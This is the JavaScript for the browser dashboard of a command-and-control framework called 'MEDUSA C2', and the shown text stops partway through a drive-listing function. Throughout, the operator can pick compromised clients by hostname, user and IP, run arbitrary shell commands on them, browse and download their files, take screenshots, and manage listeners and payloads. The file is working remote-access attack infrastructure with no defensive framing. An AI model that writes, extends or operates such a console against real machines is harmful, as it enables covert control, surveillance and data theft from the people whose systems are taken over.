/* MEDUSA C2 Framework - Dashboard JavaScript */

// Global variables
let socket;
let socketConnected = false;
let selectedClientId = null;
let selectedFileClientId = null;
let currentPath = 'C:\\';
let selectedFile = null;
let clients = {};
let globalSelectedClient = null; // Global client selection
let cpuChart, memoryChart, networkChart; // Chart instances
let activityLog = []; // Activity log storage
let settings = {
    theme: {
        primary: '#bd93f9',
        accent: '#ff79c6',
        success: '#50fa7b',
        background: '#282a36'
    },
    alerts: {
        clientConnect: true,
        clientDisconnect: true,
        fileTransfer: true,
        error: true
    },
    logging: {
        level: 'INFO',
        retention: 7,
        fileLogging: true
    },
    analytics: {
        enabled: true,
        historicalData: true,
        interval: 30
    }
};

$(document).ready(function() {
    // Initialize socket with error handling and proper configuration
    try {
        // Use Socket.IO v4 compatible configuration
        socket = io({
            transports: ['websocket', 'polling'],
            timeout: 5000,
            forceNew: true,
            autoConnect: true,
            reconnection: true,
            reconnectionAttempts: 3,
            reconnectionDelay: 1000
        });
        console.log('Socket initialized with compatibility settings');
        initializeSocket();
    } catch (e) {
        console.error('Socket initialization failed:', e);
        // Set a flag to indicate socket is not available
        socketConnected = false;
        console.log('Continuing in HTTP-only mode');
    }
    loadDashboard();
    
    // Initialize charts
    initializeCharts();
    
    // Load saved settings
    loadSettings();
    
    // Debug: Log that DOM is ready
    console.log('DOM ready, initializing event handlers');
    
    // Navigation is now handled by onclick attributes in HTML
    
    $('#command-input').keypress(function(e) {
        if (e.which === 13) executeCommand();
    });
    
    // Client selection change events
    $('#client-select').change(function() {
        selectedClientId = $(this).val();
        globalSelectedClient = selectedClientId;
        if (selectedClientId) {
            $('#command-input, #execute-btn').prop('disabled', false);
        } else {
            $('#command-input, #execute-btn').prop('disabled', true);
        }
    });
    
    // File explorer events
    $('#file-client-select').change(function() {
        const clientId = $(this).val();
        if (clientId) {
            selectedFileClientId = clientId;
            globalSelectedClient = clientId;
            browsePath('C:\\');
        }
    });
    
    // Payload type change
    $('#payload-type').change(function() {
        if ($(this).val() === 'python') {
            $('#python-options').show();
        } else {
            $('#python-options').hide();
        }
    });
    
    // Initialize tooltips
    $('[data-bs-toggle="tooltip"]').tooltip();
    
    // Log all navigation links
    console.log('Navigation links found:', $('.nav-link').length);
    $('.nav-link').each(function() {
        console.log('Nav link:', $(this).data('page'));
    });
    
    // Removed delayed initialization to prevent conflicts
});

function initializeSocket() {
    // Connection status handlers
    socket.on('connect', function() {
        console.log('Socket connected successfully - real-time features enabled');
        socketConnected = true;
        showNotification('🔗 Connection Restored', 'Real-time features enabled', 'success');
    });
    
    socket.on('disconnect', function() {
        console.log('Socket disconnected - switching to HTTP mode');
        socketConnected = false;
        showNotification('⚠️ Connection Lost', 'Switching to HTTP mode', 'warning');
    });
    
    socket.on('connect_error', function(error) {
        console.log('Socket connection failed - using HTTP fallback');
        socketConnected = false;
        // Don't show annoying notifications for connection errors
    });
    
    socket.on('client_connected', function(data) {
        clients[data.id] = data;
        updateClients();
        updateClientVisualization();
        addTerminalMessage(`Client connected: ${data.hostname}`);
        
        // Show notification based on settings
        if (settings.alerts.clientConnect) {
            showNotification('🔗 Client Connected', `${data.hostname} (${data.username}) from ${data.ip_address}`, 'success');
        }
        
        // Log activity
        logActivity('Client Connected', `${data.hostname} (${data.username}) from ${data.ip_address}`, 'success');
    });
    
    socket.on('client_disconnected', function(data) {
        delete clients[data.id];
        updateClients();
        updateClientVisualization();
        
        // Show notification based on settings
        if (settings.alerts.clientDisconnect) {
            showNotification('🔌 Client Disconnected', `Client ${data.id.substring(0, 8)}... has disconnected`, 'warning');
        }
        
        // Log activity
        logActivity('Client Disconnected', `Client ${data.id.substring(0, 8)}... has disconnected`, 'warning');
    });
    
    socket.on('task_updated', function(data) {
        console.log('Task updated:', data);
        
        if (data.client_id === selectedClientId) {
            // Display command output
            if (data.output && data.output.trim()) {
                addTerminalMessage(data.output);
            }
            // Display error if any
            if (data.error && data.error.trim()) {
                addTerminalMessage(`Error: ${data.error}`);
                if (settings.alerts.error) {
                    showNotification('❌ Command Error', data.error, 'error');
                }
            }
        }
        
        // Handle file explorer output
        if (data.client_id === selectedFileClientId && data.output) {
            console.log('File explorer output for command:', data.command);
            console.log('Output:', data.output);
            handleFileExplorerOutput(data.output, data.command);
        }
    });
    
    // Handle file content response
    socket.on('file_content', function(data) {
        if (data.client_id === selectedFileClientId) {
            $('#file-content').val(data.content);
            $('#editModal').modal('show');
        }
    });
    
    // Handle download events
    socket.on('download_requested', function(data) {
        console.log('Download requested:', data);
        if (settings.alerts.fileTransfer) {
            showNotification('📎 Download Request Sent', `Download request sent for: ${data.file_path}`, 'info');
        }
        logActivity('Download Requested', `File: ${data.file_path}`, 'info');
    });
    
    // Handle file download completion (when client sends file data)
    socket.on('file_received', function(data) {
        if (data.client_id === selectedFileClientId) {
            console.log('File received:', data);
            if (settings.alerts.fileTransfer) {
                showNotification('✅ Download Complete', `File downloaded: ${data.filename}`, 'success');
            }
            logActivity('Download Complete', `File: ${data.filename}`, 'success');
        }
    });
    
    // Handle upload events
    socket.on('file_uploaded', function(data) {
        if (data.client_id === selectedFileClientId) {
            console.log('File uploaded:', data);
            if (settings.alerts.fileTransfer) {
                showNotification('✅ Upload Complete', `File uploaded: ${data.file_path}`, 'success');
            }
            logActivity('Upload Complete', `File: ${data.file_path}`, 'success');
            setTimeout(() => refreshFiles(), 1000);
        }
    });
    
    // Handle general errors
    socket.on('error', function(data) {
        console.error('Socket error:', data);
        if (settings.alerts.error) {
            showNotification('❌ Error', data.message || 'An error occurred', 'error');
        }
        logActivity('Error', data.message || 'An error occurred', 'error');
    });
    
    // Listener event handlers
    socket.on('listener_created', function(data) {
        showNotification('✅ Listener Created', `Listener '${data.name}' created on ${data.host}:${data.port}`, 'success');
        logActivity('Listener Created', `Listener '${data.name}' on ${data.host}:${data.port}`, 'success');
        loadListeners();
    });
    
    socket.on('listener_started', function(data) {
        showNotification('▶️ Listener Started', `Listener '${data.name}' is now running`, 'success');
        logActivity('Listener Started', `Listener '${data.name}' started`, 'success');
        loadListeners();
    });
    
    socket.on('listener_stopped', function(data) {
        showNotification('⏹️ Listener Stopped', `Listener '${data.name}' has been stopped`, 'warning');
        logActivity('Listener Stopped', `Listener '${data.name}' stopped`, 'warning');
        loadListeners();
    });
    
    socket.on('listener_deleted', function(data) {
        showNotification('🗑️ Listener Deleted', `Listener '${data.name}' has been deleted`, 'info');
        logActivity('Listener Deleted', `Listener '${data.name}' deleted`, 'info');
        loadListeners();
    });
    
    socket.on('listener_error', function(data) {
        if (settings.alerts.error) {
            showNotification('❌ Listener Error', data.message, 'error');
        }
        logActivity('Listener Error', data.message, 'error');
    });
    
    // Performance data handler
    socket.on('performance_data', function(data) {
        updateCharts(data);
    });
}

function showPage(page) {
    console.log('Switching to page:', page);
    console.log('Available sections:', $('.page-section').length);
    console.log('Target section:', $(`#${page}`).length);
    
    $('.page-section').removeClass('active');
    $(`#${page}`).addClass('active');
    
    // Update active state for navigation links
    $('.nav-link').removeClass('active');
    // Find the nav link with the matching onclick attribute
    $(`.nav-link[onclick*="'${page}'"]`).addClass('active');
    
    // Auto-select global client when switching pages
    if (globalSelectedClient && clients[globalSelectedClient]) {
        if (page === 'terminal') {
            selectedClientId = globalSelectedClient;
            $('#client-select').val(globalSelectedClient);
            $('#command-input, #execute-btn').prop('disabled', false);
        } else if (page === 'filemanager') {
            selectedFileClientId = globalSelectedClient;
            $('#file-client-select').val(globalSelectedClient);
            browsePath('C:\\');
        }
    }
    
    if (page === 'clients') loadClients();
    if (page === 'listeners') loadListeners();
    if (page === 'dashboard') startPerformanceMonitoring();
    if (page === 'settings') loadSettingsIntoForm();
    
    console.log('Page switch completed for:', page);
}

function loadDashboard() {
    // Load dashboard data
    fetch('/api/clients')
        .then(response => response.json())
        .then(data => {
            clients = {};
            data.forEach(client => {
                clients[client.id] = client;
            });
            updateClients();
            updateClientVisualization();
        });
    
    // Load listener count
    fetch('/api/listeners')
        .then(response => response.json())
        .then(data => {
            $('#listener-count').text(data.length);
        });
}

function updateClients() {
    const clientSelect = $('#client-select');
    const fileClientSelect = $('#file-client-select');
    const clientsList = $('#clients-list');
    const clientCount = $('#client-count');
    
    // Update client count
    clientCount.text(Object.keys(clients).length);
    
    // Update dropdowns
    clientSelect.empty().append('<option value="">Select Client</option>');
    fileClientSelect.empty().append('<option value="">Select Client</option>');
    
    // Update clients list
    clientsList.empty();
    
    Object.values(clients).forEach(client => {
        const option = `<option value="${client.id}">${client.hostname} (${client.username})</option>`;
        clientSelect.append(option);
        fileClientSelect.append(option);
        
        // Add to clients list
        const clientRow = `
            <tr>
                <td>${client.id.substring(0, 8)}...</td>
                <td>${client.hostname}</td>
                <td>${client.username}</td>
                <td>${client.ip_address}</td>
                <td>${client.os}</td>
                <td>
                    <button class="btn btn-sm btn-primary" onclick="selectGlobalClient('${client.id}')">
                        <i class="fas fa-mouse-pointer"></i> Select
                    </button>
                    <button class="btn btn-sm btn-info" onclick="showClientInteractionModal('${client.id}')">
                        <i class="fas fa-desktop"></i> Interact
                    </button>
                </td>
            </tr>
        `;
        clientsList.append(clientRow);
    });
    
    // Restore global selection if still valid
    if (globalSelectedClient && clients[globalSelectedClient]) {
        clientSelect.val(globalSelectedClient);
        fileClientSelect.val(globalSelectedClient);
    }
    
    // Update client visualization
    updateClientVisualization();
}

// Client Visualization Functions
function updateClientVisualization() {
    const visualizationContainer = $('#clients-visualization');
    const noClientsMessage = $('#no-clients-message');
    
    // Clear existing client icons
    visualizationContainer.find('.client-icon').remove();
    
    // Show/hide no clients message
    if (Object.keys(clients).length === 0) {
        noClientsMessage.show();
        return;
    }
    
    noClientsMessage.hide();
    
    // Create client icons
    Object.values(clients).forEach(client => {
        const osClass = getOSClass(client.os);
        const clientIcon = $(`
            <div class="client-icon" data-client-id="${client.id}">
                <div class="icon-container ${osClass}">
                    <div class="status-indicator" title="Online"></div>
                    <div class="os-badge">${getOSShortName(client.os)}</div>
                </div>
                <div class="client-name" title="${client.hostname}">${truncateText(client.hostname, 15)}</div>
                <div class="client-ip">${client.ip_address}</div>
            </div>
        `);
        
        // Add click event
        clientIcon.on('click', function() {
            showClientInteractionModal(client.id);
        });
        
        visualizationContainer.append(clientIcon);
    });
}

function getOSClass(os) {
    if (os.toLowerCase().includes('windows')) {
        return 'windows';
    } else if (os.toLowerCase().includes('linux')) {
        return 'linux';
    } else if (os.toLowerCase().includes('mac') || os.toLowerCase().includes('darwin')) {
        return 'mac';
    }
    return ''; // default
}

function getOSShortName(os) {
    if (os.toLowerCase().includes('windows')) {
        return 'WIN';
    } else if (os.toLowerCase().includes('linux')) {
        return 'LNX';
    } else if (os.toLowerCase().includes('mac') || os.toLowerCase().includes('darwin')) {
        return 'MAC';
    }
    return 'UNK';
}

function truncateText(text, maxLength) {
    if (text.length <= maxLength) {
        return text;
    }
    return text.substring(0, maxLength - 3) + '...';
}

function showClientInteractionModal(clientId) {
    const client = clients[clientId];
    if (!client) return;
    
    // Create modal if it doesn't exist
    if ($('#clientInteractionModal').length === 0) {
        const modalHtml = `
            <div class="modal fade client-interaction-modal" id="clientInteractionModal" tabindex="-1">
                <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title"><i class="fas fa-desktop me-2"></i>Client Interaction</h5>
                            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                        </div>
                        <div class="modal-body">
                            <div class="client-details-card">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6><i class="fas fa-info-circle me-2"></i>Client Information</h6>
                                        <p><strong>Hostname:</strong> <span id="modal-hostname"></span></p>
                                        <p><strong>Username:</strong> <span id="modal-username"></span></p>
                                        <p><strong>IP Address:</strong> <span id="modal-ip"></span></p>
                                        <p><strong>Operating System:</strong> <span id="modal-os"></span></p>
                                    </div>
                                    <div class="col-md-6">
                                        <h6><i class="fas fa-clock me-2"></i>Connection Details</h6>
                                        <p><strong>First Seen:</strong> <span id="modal-first-seen"></span></p>
                                        <p><strong>Last Seen:</strong> <span id="modal-last-seen"></span></p>
                                        <p><strong>Client ID:</strong> <span id="modal-client-id"></span></p>
                                        <p><strong>Status:</strong> <span class="badge bg-success">Online</span></p>
                                    </div>
                                </div>
                            </div>
                            
                            <h6><i class="fas fa-bolt me-2"></i>Quick Actions</h6>
                            <div class="quick-actions">
                                <div class="quick-action-btn" onclick="quickActionTerminal()">
                                    <i class="fas fa-terminal"></i>
                                    <span>Terminal</span>
                                </div>
                                <div class="quick-action-btn" onclick="quickActionFileManager()">
                                    <i class="fas fa-folder-open"></i>
                                    <span>File Manager</span>
                                </div>
                                <div class="quick-action-btn" onclick="quickActionScreenshot()">
                                    <i class="fas fa-camera"></i>
                                    <span>Screenshot</span>
                                </div>
                                <div class="quick-action-btn" onclick="quickActionDownload()">
                                    <i class="fas fa-download"></i>
                                    <span>Download</span>
                                </div>
                                <div class="quick-action-btn" onclick="quickActionUpload()">
                                    <i class="fas fa-upload"></i>
                                    <span>Upload</span>
                                </div>
                                <div class="quick-action-btn" onclick="quickActionDisconnect()">
                                    <i class="fas fa-plug"></i>
                                    <span>Disconnect</span>
                                </div>
                            </div>
                            
                            <h6><i class="fas fa-tasks me-2"></i>Recent Commands</h6>
                            <div class="table-responsive">
                                <table class="table table-dark table-striped table-sm">
                                    <thead>
                                        <tr>
                                            <th>Command</th>
                                            <th>Time</th>
                                            <th>Status</th>
                                        </tr>
                                    </thead>
                                    <tbody id="modal-command-history">
                                        <tr>
                                            <td colspan="3" class="text-center">No commands executed</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                            <button type="button" class="btn btn-primary" onclick="openFullTerminal()">Open Full Terminal</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        $('body').append(modalHtml);
    }
    
    // Update modal content
    $('#modal-hostname').text(client.hostname);
    $('#modal-username').text(client.username);
    $('#modal-ip').text(client.ip_address);
    $('#modal-os').text(client.os);
    $('#modal-first-seen').text(client.first_seen);
    $('#modal-last-seen').text(client.last_seen);
    $('#modal-client-id').text(client.id.substring(0, 8) + '...');
    
    // Store selected client ID
    globalSelectedClient = clientId;
    
    // Show modal
    $('#clientInteractionModal').modal('show');
}

// Quick Action Functions
function quickActionTerminal() {
    $('#clientInteractionModal').modal('hide');
    showPage('terminal');
    // Auto-select the client in terminal
    $('#client-select').val(globalSelectedClient);
    selectedClientId = globalSelectedClient;
    $('#command-input, #execute-btn').prop('disabled', false);
}

function quickActionFileManager() {
    $('#clientInteractionModal').modal('hide');
    showPage('filemanager');
    // Auto-select the client in file manager
    $('#file-client-select').val(globalSelectedClient);
    selectedFileClientId = globalSelectedClient;
    browsePath('C:\\');
}

function quickActionScreenshot() {
    if (!socket || !socketConnected) {
        showNotification('❌ Error', 'Not connected to server', 'error');
        return;
    }
    
    socket.emit('execute_command', {
        client_id: globalSelectedClient,
        command: 'screenshot'
    });
    
    showNotification('📷 Screenshot Requested', 'Screenshot request sent to client', 'info');
    $('#clientInteractionModal').modal('hide');
}

function quickActionDownload() {
    showNotification('📥 Download', 'Please use File Manager for downloads', 'info');
    quickActionFileManager();
}

function quickActionUpload() {
    showNotification('📤 Upload', 'Please use File Manager for uploads', 'info');
    quickActionFileManager();
}

function quickActionDisconnect() {
    if (confirm('Are you sure you want to disconnect this client?')) {
        // In a real implementation, you would send a disconnect command to the client
        showNotification('🔌 Disconnect', 'Client disconnect functionality would be implemented here', 'info');
    }
}

function openFullTerminal() {
    $('#clientInteractionModal').modal('hide');
    showPage('terminal');
    // Auto-select the client in terminal
    $('#client-select').val(globalSelectedClient);
    selectedClientId = globalSelectedClient;
    $('#command-input, #execute-btn').prop('disabled', false);
}

function selectGlobalClient(clientId) {
    globalSelectedClient = clientId;
    updateClients();
    showNotification('✅ Client Selected', `Client ${clients[clientId].hostname} selected globally`, 'success');
}

function loadClients() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(data => {
            clients = {};
            data.forEach(client => {
                clients[client.id] = client;
            });
            updateClients();
        });
}

function executeCommand() {
    const command = $('#command-input').val().trim();
    if (!command || !selectedClientId) return;
    
    addTerminalMessage(`<span style="color: #ff79c6;">medusac2$></span> ${command}`);
    
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch('/api/execute', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                client_id: selectedClientId,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                addTerminalMessage('Command sent successfully (check for output updates)');
            } else {
                addTerminalMessage(`Error: ${data.error || 'Failed to send command'}`);
            }
        })
        .catch(error => {
            console.error('Error executing command:', error);
            addTerminalMessage('Error: Failed to send command');
        });
    } else {
        socket.emit('execute_command', {
            client_id: selectedClientId,
            command: command
        });
    }
    
    $('#command-input').val('');
}

function addTerminalMessage(message) {
    const terminal = $('#terminal-output');
    
    // Check if message contains HTML (for colored output)
    if (message.includes('<span')) {
        terminal.append(`<div>${message}</div>`);
    } else {
        // For regular command output, use <pre> to preserve exact formatting
        const preElement = $('<pre>').css({
            'margin': '0 0 5px 0',
            'padding': '0',
            'font-family': 'inherit',
            'color': 'inherit',
            'background': 'transparent',
            'border': 'none',
            'white-space': 'pre-wrap',
            'word-wrap': 'break-word',
            'overflow-wrap': 'break-word'
        }).text(message);
        
        terminal.append(preElement);
    }
    
    // Auto-scroll to bottom
    terminal.scrollTop(terminal[0].scrollHeight);
    
    // If this was a directory change, update the prompt
    if (message.includes('Directory changed to:')) {
        // Add a visual indicator of directory change
        const pathMatch = message.match(/Directory changed to: (.+)/);
        if (pathMatch) {
            const newPath = pathMatch[1];
            terminal.append(`<div style="color: var(--dracula-purple); font-weight: bold; margin: 5px 0;">Current directory: ${newPath}</div>`);
            terminal.scrollTop(terminal[0].scrollHeight);
        }
    }
}

// Notification System
function showNotification(title, message, type = 'success') {
    const notification = $(`
        <div class="notification ${type}">
            <div class="notification-title">${title}</div>
            <div class="notification-message">${message}</div>
        </div>
    `);
    
    $('body').append(notification);
    
    // Show notification
    setTimeout(() => {
        notification.addClass('show');
    }, 100);
    
    // Auto hide after 4 seconds
    setTimeout(() => {
        notification.removeClass('show');
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 4000);
}

// Activity Logging System
function logActivity(event, details, status) {
    const timestamp = new Date().toLocaleTimeString();
    activityLog.unshift({
        timestamp: timestamp,
        event: event,
        details: details,
        status: status
    });
    
    // Keep only the last 50 activities
    if (activityLog.length > 50) {
        activityLog = activityLog.slice(0, 50);
    }
    
    updateActivityLog();
}

function updateActivityLog() {
    const logBody = $('#activity-log');
    logBody.empty();
    
    if (activityLog.length === 0) {
        logBody.append('<tr><td colspan="4" class="text-center">No recent activity</td></tr>');
        return;
    }
    
    activityLog.slice(0, 10).forEach(entry => {
        let statusBadge = '';
        switch(entry.status) {
            case 'success':
                statusBadge = '<span class="badge bg-success">Success</span>';
                break;
            case 'warning':
                statusBadge = '<span class="badge bg-warning">Warning</span>';
                break;
            case 'error':
                statusBadge = '<span class="badge bg-danger">Error</span>';
                break;
            case 'info':
                statusBadge = '<span class="badge bg-info">Info</span>';
                break;
            default:
                statusBadge = '<span class="badge bg-secondary">Unknown</span>';
        }
        
        const row = `
            <tr>
                <td>${entry.timestamp}</td>
                <td>${entry.event}</td>
                <td>${entry.details}</td>
                <td>${statusBadge}</td>
            </tr>
        `;
        logBody.append(row);
    });
}

// Performance Monitoring
function initializeCharts() {
    // Initialize Chart.js charts
    const cpuCtx = document.getElementById('cpuChart').getContext('2d');
    const memoryCtx = document.getElementById('memoryChart').getContext('2d');
    const networkCtx = document.getElementById('networkChart').getContext('2d');
    
    // CPU Chart
    cpuChart = new Chart(cpuCtx, {
        type: 'line',
        data: {
            labels: Array(10).fill('').map((_, i) => `${i*5}s`),
            datasets: [{
                label: 'CPU Usage (%)',
                data: Array(10).fill(0),
                borderColor: '#ff79c6',
                backgroundColor: 'rgba(255, 121, 198, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                y: {
                    min: 0,
                    max: 100,
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                },
                x: {
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                }
            },
            plugins: {
                legend: {
                    labels: {
                        color: '#f8f8f2'
                    }
                }
            }
        }
    });
    
    // Memory Chart
    memoryChart = new Chart(memoryCtx, {
        type: 'line',
        data: {
            labels: Array(10).fill('').map((_, i) => `${i*5}s`),
            datasets: [{
                label: 'Memory Usage (%)',
                data: Array(10).fill(0),
                borderColor: '#50fa7b',
                backgroundColor: 'rgba(80, 250, 123, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                y: {
                    min: 0,
                    max: 100,
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                },
                x: {
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                }
            },
            plugins: {
                legend: {
                    labels: {
                        color: '#f8f8f2'
                    }
                }
            }
        }
    });
    
    // Network Chart
    networkChart = new Chart(networkCtx, {
        type: 'line',
        data: {
            labels: Array(10).fill('').map((_, i) => `${i*5}s`),
            datasets: [
                {
                    label: 'Network In (KB/s)',
                    data: Array(10).fill(0),
                    borderColor: '#8be9fd',
                    backgroundColor: 'rgba(139, 233, 253, 0.1)',
                    tension: 0.4,
                    fill: true
                },
                {
                    label: 'Network Out (KB/s)',
                    data: Array(10).fill(0),
                    borderColor: '#bd93f9',
                    backgroundColor: 'rgba(189, 147, 249, 0.1)',
                    tension: 0.4,
                    fill: true
                }
            ]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                y: {
                    beginAtZero: true,
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                },
                x: {
                    grid: {
                        color: 'rgba(189, 147, 249, 0.1)'
                    },
                    ticks: {
                        color: '#f8f8f2'
                    }
                }
            },
            plugins: {
                legend: {
                    labels: {
                        color: '#f8f8f2'
                    }
                }
            }
        }
    });
}

function updateCharts(data) {
    if (!cpuChart || !memoryChart || !networkChart) return;
    
    // Update CPU chart
    const cpuData = cpuChart.data.datasets[0].data;
    cpuData.push(data.cpu || 0);
    if (cpuData.length > 10) cpuData.shift();
    cpuChart.update();
    
    // Update Memory chart
    const memoryData = memoryChart.data.datasets[0].data;
    memoryData.push(data.memory || 0);
    if (memoryData.length > 10) memoryData.shift();
    memoryChart.update();
    
    // Update Network chart
    const networkInData = networkChart.data.datasets[0].data;
    const networkOutData = networkChart.data.datasets[1].data;
    networkInData.push(data.network_in || 0);
    networkOutData.push(data.network_out || 0);
    if (networkInData.length > 10) {
        networkInData.shift();
        networkOutData.shift();
    }
    networkChart.update();
}

function startPerformanceMonitoring() {
    if (settings.analytics.enabled && socketConnected) {
        // Request performance data from server
        socket.emit('request_performance_data');
        
        // Set up periodic updates
        setInterval(() => {
            if (socketConnected) {
                socket.emit('request_performance_data');
            }
        }, settings.analytics.interval * 1000);
    }
}

// Settings Management
function loadSettings() {
    // Load settings from localStorage if available
    const savedSettings = localStorage.getItem('medusaSettings');
    if (savedSettings) {
        try {
            settings = JSON.parse(savedSettings);
        } catch (e) {
            console.error('Error loading settings:', e);
        }
    }
    
    // Apply theme
    applyThemeSettings();
}

function loadSettingsIntoForm() {
    // Load theme settings
    $('#primary-color').val(settings.theme.primary);
    $('#accent-color').val(settings.theme.accent);
    $('#success-color').val(settings.theme.success);
    $('#bg-color').val(settings.theme.background);
    
    // Load alert settings
    $('#alert-client-connect').prop('checked', settings.alerts.clientConnect);
    $('#alert-client-disconnect').prop('checked', settings.alerts.clientDisconnect);
    $('#alert-file-transfer').prop('checked', settings.alerts.fileTransfer);
    $('#alert-error').prop('checked', settings.alerts.error);
    
    // Load logging settings
    $('#log-level').val(settings.logging.level);
    $('#log-retention').val(settings.logging.retention);
    $('#enable-file-logging').prop('checked', settings.logging.fileLogging);
    
    // Load analytics settings
    $('#enable-analytics').prop('checked', settings.analytics.enabled);
    $('#enable-historical-data').prop('checked', settings.analytics.historicalData);
    $('#data-interval').val(settings.analytics.interval);
    
    // Add event handlers for real-time updates
    $('#primary-color, #accent-color, #success-color, #bg-color').off('change.settings').on('change.settings', function() {
        applyTheme();
    });
    
    $('#alert-client-connect, #alert-client-disconnect, #alert-file-transfer, #alert-error').off('change.settings').on('change.settings', function() {
        saveAlertSettings();
    });
    
    $('#log-level, #log-retention, #enable-file-logging').off('change.settings').on('change.settings', function() {
        saveLogSettings();
    });
    
    $('#enable-analytics, #enable-historical-data, #data-interval').off('change.settings').on('change.settings', function() {
        saveAnalyticsSettings();
    });
}

function applyTheme() {
    settings.theme.primary = $('#primary-color').val();
    settings.theme.accent = $('#accent-color').val();
    settings.theme.success = $('#success-color').val();
    settings.theme.background = $('#bg-color').val();
    
    saveSettings();
    applyThemeSettings();
    showNotification('🎨 Theme Applied', 'Custom theme has been applied', 'success');
}

function resetTheme() {
    settings.theme = {
        primary: '#bd93f9',
        accent: '#ff79c6',
        success: '#50fa7b',
        background: '#282a36'
    };
    
    saveSettings();
    loadSettingsIntoForm();
    applyThemeSettings();
    showNotification('🔄 Theme Reset', 'Theme has been reset to default', 'info');
}

function applyThemeSettings() {
    // Apply CSS variables
    document.documentElement.style.setProperty('--dracula-purple', settings.theme.primary);
    document.documentElement.style.setProperty('--dracula-pink', settings.theme.accent);
    document.documentElement.style.setProperty('--dracula-green', settings.theme.success);
    document.documentElement.style.setProperty('--dracula-bg', settings.theme.background);
}

function saveAlertSettings() {
    settings.alerts.clientConnect = $('#alert-client-connect').is(':checked');
    settings.alerts.clientDisconnect = $('#alert-client-disconnect').is(':checked');
    settings.alerts.fileTransfer = $('#alert-file-transfer').is(':checked');
    settings.alerts.error = $('#alert-error').is(':checked');
    
    saveSettings();
    showNotification('✅ Settings Saved', 'Alert configuration has been saved', 'success');
}

function saveLogSettings() {
    settings.logging.level = $('#log-level').val();
    settings.logging.retention = parseInt($('#log-retention').val());
    settings.logging.fileLogging = $('#enable-file-logging').is(':checked');
    
    saveSettings();
    showNotification('✅ Settings Saved', 'Logging configuration has been saved', 'success');
}

function saveAnalyticsSettings() {
    settings.analytics.enabled = $('#enable-analytics').is(':checked');
    settings.analytics.historicalData = $('#enable-historical-data').is(':checked');
    settings.analytics.interval = parseInt($('#data-interval').val());
    
    saveSettings();
    showNotification('✅ Settings Saved', 'Analytics configuration has been saved', 'success');
}

function saveSettings() {
    localStorage.setItem('medusaSettings', JSON.stringify(settings));
}

function viewLogs() {
    showNotification('📋 Logs', 'Log viewing functionality would be implemented here', 'info');
}

// File Explorer Functions
function browsePath(path) {
    if (!selectedFileClientId) {
        showNotification('❌ Error', 'Please select a client first', 'error');
        return;
    }
    
    // Normalize the path for Windows
    path = path.replace(/\//g, '\\').replace(/\\+/g, '\\');
    
    // Ensure drive paths end with backslash
    if (path.match(/^[A-Za-z]:$/)) {
        path += '\\';
    }
    
    currentPath = path;
    $('#current-path').text(path);
    
    console.log('Browsing path:', path);
    
    // Send simple dir command - Windows specific for now
    const listCommand = 'dir /b "' + path + '"';
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: listCommand
    });
}

function listAllDrives() {
    if (!selectedFileClientId) {
        showNotification('❌ Error', 'Please select a client first', 'error');
        return;
    }
    
    currentPath = 'Drives';
    $('#current-path').text('All Drives');
    
    // Use PowerShell instead of deprecated wmic for better Windows 11 compatibility
    const driveCommand = 'powershell "Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | Format-Table -AutoSize"';
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: driveCommand
    });
}

function handleFileExplorerOutput(output, command) {
    if (command && (command.includes('wmic logicaldisk') || command.includes('Get-WmiObject -Class Win32_LogicalDisk'))) {
        displayDrives(output);
    } else if (command && command.includes('dir /b')) {
        displayDirectoryListing(output, currentPath);
    }
}

// Enhanced displayDrives function to handle both wmic and PowerShell output
function displayDrives(output) {
    const explorer = $('#file-explorer');
    explorer.empty();
    
    explorer.append('<div class="p-2 border-bottom bg-secondary"><h6 class="mb-0"><i class="fas fa-server me-2"></i>Available Drives</h6></div>');
    
    // Check if it's PowerShell output (contains DeviceID, Size, FreeSpace headers)
    if (output.includes('DeviceID') && output.includes('Size') && output.includes('FreeSpace')) {
        // Parse PowerShell output
        const lines = output.split('\n').filter(line => {
            const trimmed = line.trim();
            return trimmed && 
                   !trimmed.includes('DeviceID') && 
                   !trimmed.includes('--------') && 
                   trimmed.includes(':');
        });
        
        lines.forEach(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 3) {
                const deviceId = parts[0]; // C:, D:, etc.
                const totalSize = parts[1] ? formatBytes(parseInt(parts[1])) : 'Unknown';
                const freeSpace = parts[2] ? formatBytes(parseInt(parts[2])) : 'Unknown';
                
                if (deviceId && deviceId.includes(':')) {
                    createDriveElement(deviceId, freeSpace, totalSize, explorer);
                }
            }
        });
    } else {
        // Parse legacy wmic output
        const lines = output.split('\n').filter(line => line.trim() && !line.includes('Caption') && !line.includes('---'));
        
        lines.forEach(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 3) {
                const caption = parts[0]; // C:, D:, etc.
